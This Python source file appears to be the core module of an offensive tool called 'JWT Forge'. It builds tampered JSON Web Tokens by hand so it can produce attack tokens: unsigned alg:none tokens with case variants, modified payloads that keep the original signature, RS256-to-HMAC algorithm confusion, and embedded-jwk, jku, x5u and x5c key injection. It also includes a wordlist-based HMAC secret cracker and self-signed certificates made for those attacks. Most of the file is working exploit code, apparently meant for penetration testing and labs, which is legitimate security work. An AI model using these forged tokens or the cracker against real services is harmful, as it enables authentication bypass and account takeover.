"""
jwt_core.py — low-level JWT engine for JWT Forge.

This deliberately does NOT use PyJWT for building tokens. PyJWT (correctly)
refuses to produce many of the malformed / attack tokens we need:
  - alg: none with a payload change
  - re-encoding a payload while keeping the ORIGINAL signature untouched
    (for servers that never verify the signature — the classic PortSwigger case)
  - algorithm confusion (RS256 public key used as an HMAC secret)
  - embedded jwk / jku / kid trickery

So everything here is built from base64url + raw crypto primitives, which gives
us total control over the three segments of the token.
"""

from __future__ import annotations

import base64
import datetime
import hashlib
import hmac
import json
from dataclasses import dataclass, field
from typing import Any, Optional

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, padding, rsa
from cryptography.hazmat.primitives.asymmetric.utils import (
    decode_dss_signature,
    encode_dss_signature,
)
from cryptography.exceptions import InvalidSignature


# ----------------------------------------------------------------------------
# base64url helpers (no padding, url-safe) — the alphabet of every JWT segment
# ----------------------------------------------------------------------------

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(segment: str) -> bytes:
    seg = segment.encode("ascii") if isinstance(segment, str) else segment
    pad = -len(seg) % 4
    return base64.urlsafe_b64decode(seg + b"=" * pad)


def _json_segment(obj: Any) -> str:
    # compact separators, preserve key order the caller gives us
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return b64url_encode(raw)


# ----------------------------------------------------------------------------
# Hash + alg tables
# ----------------------------------------------------------------------------

_HMAC_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_CH = {"256": hashes.SHA256, "384": hashes.SHA384, "512": hashes.SHA512}
_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "nonE"]


# ----------------------------------------------------------------------------
# Decoding / inspection
# ----------------------------------------------------------------------------

@dataclass
class DecodedToken:
    header: dict
    payload: Any
    signature_b64: str
    raw_header_b64: str
    raw_payload_b64: str
    signing_input: str  # "header.payload" — what the signature is computed over

    def to_dict(self) -> dict:
        return {
            "header": self.header,
            "payload": self.payload,
            "signature": self.signature_b64,
            "raw": {
                "header_b64": self.raw_header_b64,
                "payload_b64": self.raw_payload_b64,
            },
            "signing_input": self.signing_input,
            "alg": self.header.get("alg"),
        }


def decode_token(token: str) -> DecodedToken:
    token = token.strip().strip('"').strip("'")
    # tolerate a "Bearer " prefix pasted by accident
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("Not a JWT: fewer than 2 dot-separated segments.")
    h_b64, p_b64 = parts[0], parts[1]
    sig_b64 = parts[2] if len(parts) >= 3 else ""

    def _load(seg: str, name: str):
        try:
            raw = b64url_decode(seg)
        except Exception as e:
            raise ValueError(f"{name} is not valid base64url: {e}")
        try:
            return json.loads(raw)
        except Exception:
            # payload might not be JSON (rare) — hand back the text
            return raw.decode("utf-8", "replace")

    header = _load(h_b64, "Header")
    payload = _load(p_b64, "Payload")
    if not isinstance(header, dict):
        raise ValueError("Header did not decode to a JSON object.")

    return DecodedToken(
        header=header,
        payload=payload,
        signature_b64=sig_b64,
        raw_header_b64=h_b64,
        raw_payload_b64=p_b64,
        signing_input=f"{h_b64}.{p_b64}",
    )


# ----------------------------------------------------------------------------
# Signing primitives
# ----------------------------------------------------------------------------

def _sign_hmac(signing_input: bytes, secret: bytes, alg: str) -> bytes:
    return hmac.new(secret, signing_input, _HMAC_HASH[alg]).digest()


def _load_private_key(pem: str):
    return serialization.load_pem_private_key(pem.encode(), password=None)


def _load_public_key(pem: str):
    return serialization.load_pem_public_key(pem.encode())


def _sign_rsa(signing_input: bytes, private_pem: str, alg: str, pss: bool) -> bytes:
    key = _load_private_key(private_pem)
    if not isinstance(key, rsa.RSAPrivateKey):
        raise ValueError("Provided private key is not RSA.")
    chosen = _CH[alg[-3:]]()
    if pss:
        pad = padding.PSS(mgf=padding.MGF1(chosen), salt_length=padding.PSS.DIGEST_LENGTH)
    else:
        pad = padding.PKCS1v15()
    return key.sign(signing_input, pad, chosen)


def _sign_ec(signing_input: bytes, private_pem: str, alg: str) -> bytes:
    key = _load_private_key(private_pem)
    if not isinstance(key, ec.EllipticCurvePrivateKey):
        raise ValueError("Provided private key is not EC.")
    chosen = _CH[alg[-3:]]()
    der = key.sign(signing_input, ec.ECDSA(chosen))
    r, s = decode_dss_signature(der)
    size = (key.curve.key_size + 7) // 8
    return r.to_bytes(size, "big") + s.to_bytes(size, "big")  # JOSE raw r||s


# ----------------------------------------------------------------------------
# The one function that builds every token variant.
#
# `signing` is a dict describing HOW to attach a signature:
#   {"method": "hmac", "alg": "HS256", "secret": "..."}
#   {"method": "rsa",  "alg": "RS256", "private_key": "<pem>"}       # or PS*
#   {"method": "ec",   "alg": "ES256", "private_key": "<pem>"}
#   {"method": "none", "alg": "none"}                                # empty sig
#   {"method": "keep", "signature": "<orig b64url sig>"}            # verbatim
#   {"method": "raw",  "signature_bytes": b"..."}                   # verbatim bytes
# ----------------------------------------------------------------------------

def encode_token(header: dict, payload: Any, signing: dict) -> str:
    h_b64 = _json_segment(header)
    p_b64 = _json_segment(payload)
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")

    method = signing.get("method")

    if method == "none":
        return f"{h_b64}.{p_b64}."

    if method == "keep":
        return f"{h_b64}.{p_b64}.{signing.get('signature', '')}"

    if method == "raw":
        return f"{h_b64}.{p_b64}.{b64url_encode(signing['signature_bytes'])}"

    if method == "hmac":
        sig = _sign_hmac(signing_input, signing["secret"].encode("utf-8"), signing["alg"])
    elif method == "rsa":
        sig = _sign_rsa(signing_input, signing["private_key"], signing["alg"],
                        pss=signing["alg"].startswith("PS"))
    elif method == "ec":
        sig = _sign_ec(signing_input, signing["private_key"], signing["alg"])
    else:
        raise ValueError(f"Unknown signing method: {method!r}")

    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"


# ----------------------------------------------------------------------------
# Verification (used by the cracker and by "test a secret")
# ----------------------------------------------------------------------------

def verify_hmac(signing_input: str, signature_b64: str, secret: bytes, alg: str) -> bool:
    expected = _sign_hmac(signing_input.encode("ascii"), secret, alg)
    try:
        actual = b64url_decode(signature_b64)
    except Exception:
        return False
    return hmac.compare_digest(expected, actual)


def crack_hmac(token: str, wordlist: list[str]) -> dict:
    """Try each candidate as the HMAC secret. Client supplies the wordlist."""
    dec = decode_token(token)
    alg = dec.header.get("alg", "")
    if alg not in _HMAC_HASH:
        return {"cracked": False, "reason": f"alg is {alg!r}, not an HS* token.",
                "tested": 0}
    tested = 0
    for candidate in wordlist:
        tested += 1
        if verify_hmac(dec.signing_input, dec.signature_b64,
                       candidate.encode("utf-8"), alg):
            return {"cracked": True, "secret": candidate, "tested": tested, "alg": alg}
    return {"cracked": False, "tested": tested, "alg": alg}


def verify_rsa_ec(token: str, public_pem: str) -> dict:
    dec = decode_token(token)
    alg = dec.header.get("alg", "")
    signing_input = dec.signing_input.encode("ascii")
    try:
        sig = b64url_decode(dec.signature_b64)
    except Exception as e:
        return {"valid": False, "reason": f"bad signature b64: {e}"}
    try:
        pub = _load_public_key(public_pem)
    except Exception as e:
        return {"valid": False, "reason": f"bad public key: {e}"}
    try:
        if alg.startswith("RS") or alg.startswith("PS"):
            chosen = _CH[alg[-3:]]()
            if alg.startswith("PS"):
                pad = padding.PSS(mgf=padding.MGF1(chosen),
                                  salt_length=padding.PSS.DIGEST_LENGTH)
            else:
                pad = padding.PKCS1v15()
            pub.verify(sig, signing_input, pad, chosen)
        elif alg.startswith("ES"):
            size = len(sig) // 2
            r = int.from_bytes(sig[:size], "big")
            s = int.from_bytes(sig[size:], "big")
            pub.verify(encode_dss_signature(r, s), signing_input,
                       ec.ECDSA(_CH[alg[-3:]]()))
        else:
            return {"valid": False, "reason": f"alg {alg!r} not RSA/EC"}
        return {"valid": True, "alg": alg}
    except InvalidSignature:
        return {"valid": False, "reason": "signature does not match this key", "alg": alg}


# ----------------------------------------------------------------------------
# Key generation
# ----------------------------------------------------------------------------

def generate_rsa(bits: int = 2048) -> dict:
    key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    return _key_material(key)


def generate_ec(curve: str = "P-256") -> dict:
    curves = {"P-256": ec.SECP256R1(), "P-384": ec.SECP384R1(), "P-521": ec.SECP521R1()}
    key = ec.generate_private_key(curves[curve])
    return _key_material(key)


def generate_self_signed_cert(bits: int = 2048, private_pem: Optional[str] = None) -> dict:
    """RSA key + self-signed X.509 cert, for x5u (hosted) / x5c (embedded) attacks."""
    if private_pem:
        key = _load_private_key(private_pem)
        if not isinstance(key, rsa.RSAPrivateKey):
            raise ValueError("x5u/x5c require an RSA private key.")
    else:
        key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "jwtforge")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=3650))
        .sign(key, hashes.SHA256())
    )
    mat = _key_material(key)
    mat["cert_pem"] = cert.public_bytes(serialization.Encoding.PEM).decode()
    # x5c is standard base64 (NOT base64url) of the DER cert
    mat["x5c"] = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()
    return mat


def _key_material(key) -> dict:
    priv_pem = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    pub = key.public_key()
    pub_pem = pub.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()
    return {
        "private_key": priv_pem,
        "public_key": pub_pem,
        "jwk": public_jwk(pub),
    }


# ----------------------------------------------------------------------------
# JWK helpers (for embedded-jwk, jku, x5u attacks)
# ----------------------------------------------------------------------------

def _b64url_uint(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return b64url_encode(n.to_bytes(length, "big"))


def public_jwk(pub, kid: str = "jwtforge") -> dict:
    if isinstance(pub, rsa.RSAPublicKey):
        nums = pub.public_numbers()
        return {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
                "n": _b64url_uint(nums.n), "e": _b64url_uint(nums.e)}
    if isinstance(pub, ec.EllipticCurvePublicKey):
        nums = pub.public_numbers()
        size = (pub.curve.key_size + 7) // 8
        crv = {256: "P-256", 384: "P-384", 521: "P-521"}[pub.curve.key_size]
        return {"kty": "EC", "use": "sig", "crv": crv, "kid": kid,
                "x": b64url_encode(nums.x.to_bytes(size, "big")),
                "y": b64url_encode(nums.y.to_bytes(size, "big"))}
    raise ValueError("Unsupported key type for JWK export")


def public_pem_from_jwk(jwk: dict) -> str:
    """Rebuild a PEM public key from a JWK (used to reproduce a target's key)."""
    if jwk.get("kty") == "RSA":
        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
    elif jwk.get("kty") == "EC":
        curves = {"P-256": ec.SECP256R1(), "P-384": ec.SECP384R1(),
                  "P-521": ec.SECP521R1()}
        x = int.from_bytes(b64url_decode(jwk["x"]), "big")
        y = int.from_bytes(b64url_decode(jwk["y"]), "big")
        pub = ec.EllipticCurvePublicNumbers(x, y, curves[jwk["crv"]]).public_key()
    else:
        raise ValueError("JWK kty must be RSA or EC")
    return pub.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()
